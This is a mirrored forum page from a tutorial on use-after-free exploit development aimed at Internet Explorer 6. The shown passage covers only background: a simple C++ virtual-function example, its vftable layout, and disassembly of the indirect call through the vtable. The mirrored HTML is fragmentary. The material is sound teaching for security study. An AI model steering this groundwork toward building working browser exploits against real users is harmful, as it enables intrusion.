<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html dir="ltr" lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml"><!-- Mirrored from garage4hackers.com/content.php?r=143-Beginners-Guide-to-Use-after-free-Exploits-IE-6-0-day-Exploit-Development&s=d23abe6629e94daeddb675edad35f5c7 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sat, 21 Mar 2020 09:09:49 GMT --><!-- Added by HTTrack --><head><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->

    <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<meta content="index.html" id="e_vb_meta_bburl" name="vb_meta_bburl"/>
<base/><!--[if IE]></base><![endif]-->
<meta content="vBulletin 4.2.1" name="generator"/>
<meta content="IE=9" http-equiv="X-UA-Compatible"/>

	<link href="favicon.ico" rel="Shortcut Icon" type="image/x-icon"/>


		<meta content="" name="keywords"/>
		<meta content="heap memory free stack data line stored program virtual segment" name="description"/>



	<meta content="170793809601191" property="fb:app_id"/>
<meta content="Garage4hackers Forum" property="og:site_name"/>
<meta content="heap memory free stack data line stored program virtual segment" property="og:description"/>
<meta content="content34e8.html?r=143-Beginners-Guide-to-Use-after-free-Exploits-IE-6-0-day-Exploit-Development" property="og:url"/>

<span style="color: #0000BB"></span><span style="color: #FF8000">#include&lt;iostream&gt;<br/></span><span style="color: #0000BB">using </span><span style="color: #007700">namespace </span><span style="color: #0000BB">std</span><span style="color: #007700">;<br/><br/>class </span><span style="color: #0000BB">Test<br/></span><span style="color: #007700">{<br/>    public :<br/><br/>        </span><span style="color: #0000BB">virtual void Show</span><span style="color: #007700">()<br/>        {<br/>            </span><span style="color: #0000BB">cout</span><span style="color: #007700">&lt;&lt;</span><span style="color: #DD0000">"I am in Test Class"</span><span style="color: #007700">&lt;&lt;</span><span style="color: #0000BB">endl</span><span style="color: #007700">;<br/>        }<br/>};<br/><br/>class </span><span style="color: #0000BB">Test1 </span><span style="color: #007700">: public </span><span style="color: #0000BB">Test<br/></span><span style="color: #007700">{<br/>      public:<br/>           </span><span style="color: #0000BB">virtual void Show</span><span style="color: #007700">()<br/>           {<br/>            </span><span style="color: #0000BB">cout</span><span style="color: #007700">&lt;&lt;</span><span style="color: #DD0000">"I am in Test1 Class"</span><span style="color: #007700">&lt;&lt;</span><span style="color: #0000BB">endl</span><span style="color: #007700">;<br/>           }<br/><br/>};<br/><br/></span><span style="color: #0000BB">int main</span><span style="color: #007700">()<br/>{<br/>    </span><span style="color: #0000BB">Test </span><span style="color: #007700">*</span><span style="color: #0000BB">Obj</span><span style="color: #007700">;<br/><br/>    </span><span style="color: #0000BB">Test Obj1</span><span style="color: #007700">;   </span><span style="color: #FF8000">// Base Class Object<br/><br/>    </span><span style="color: #0000BB">Test1 Obj2</span><span style="color: #007700">;  </span><span style="color: #FF8000">//Derived Class Object<br/><br/>    </span><span style="color: #0000BB">Obj </span><span style="color: #007700">= &amp;</span><span style="color: #0000BB">Obj2</span><span style="color: #007700">;<br/><br/>    </span><span style="color: #0000BB">Obj</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">Show</span><span style="color: #007700">();  </span><span style="color: #FF8000">//In this case derived class show function called.<br/><br/>    </span><span style="color: #0000BB">Obj </span><span style="color: #007700">= &amp;</span><span style="color: #0000BB">Obj1</span><span style="color: #007700">;<br/><br/>    </span><span style="color: #0000BB">Obj</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">Show</span><span style="color: #007700">(); </span><span style="color: #FF8000">//In this case Base class show function called.<br/></span><span style="color: #007700">}<br/><br/>[</span><span style="color: #0000BB">B</span><span style="color: #007700">]And </span><span style="color: #0000BB">the output is </span><span style="color: #007700">:[/</span><span style="color: #0000BB">B</span><span style="color: #007700">]<br/><br/>[</span><span style="color: #0000BB">CODE</span><span style="color: #007700">]</span><span style="color: #0000BB">I am in Test1 </span><span style="color: #007700">Class<br/></span><span style="color: #0000BB">I am in Test </span><span style="color: #007700">Class[/</span><span style="color: #0000BB">CODE</span><span style="color: #007700">] 
<br/></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div><a href="http://www.go4expert.com/forums/showthread.php?t=5495" target="_blank">Virtual Functions in C++</a><br/>
<a href="../external.html?link=http://publib.boulder.ibm.com/infocenter/lnxpcomp/v8v101/index.jsp?topic=%2Fcom.ibm.xlcpp8l.doc%2Flanguage%2Fref%2Fcplr139.htm" target="_blank">IBM Linux Compilers</a><br/>
<br/>
The above program will have the following vftable structure. <br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:252px;"><font color="#800000">Class Test size(8):</font>
      <font color="#800000">+---
      |{vfptr}
      +---
      
      Test's Vftable:
      +--
      | {vfptr}
      | &amp;test::Show
      
Class Test1 size(8):
      +---
      |{vfptr}
      +---      
      
      Test1's Vftable:
      +--
      | {vfptr}
      | &amp;test1::Show</font></pre>
</div><img alt="" border="0" src="attachment72fc.jpg?attachmentid=558&amp;d=1352974751" style="float: CONFIG"/><br/>
<br/>
<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:372px;">
004013D0  |. 8D45 C8        LEA EAX,DWORD PTR SS:[EBP-38]
004013D3  |. 8945 F4        MOV DWORD PTR SS:[EBP-C],EAX
004013D6  |. 8B45 F4        MOV EAX,DWORD PTR SS:[EBP-C]
004013D9  |. 8B10           MOV EDX,DWORD PTR DS:[EAX]
004013DB  |. 8B45 F4        MOV EAX,DWORD PTR SS:[EBP-C]
004013DE  |. 890424         MOV DWORD PTR SS:[ESP],EAX
004013E1  |. 8B02           MOV EAX,DWORD PTR DS:[EDX]
<b>004013E3  |. FFD0           CALL EAX
</b>

<font color="#0000ff">Here EAX point to the Virtual Function table which point to calls the "Test1" 
</font>
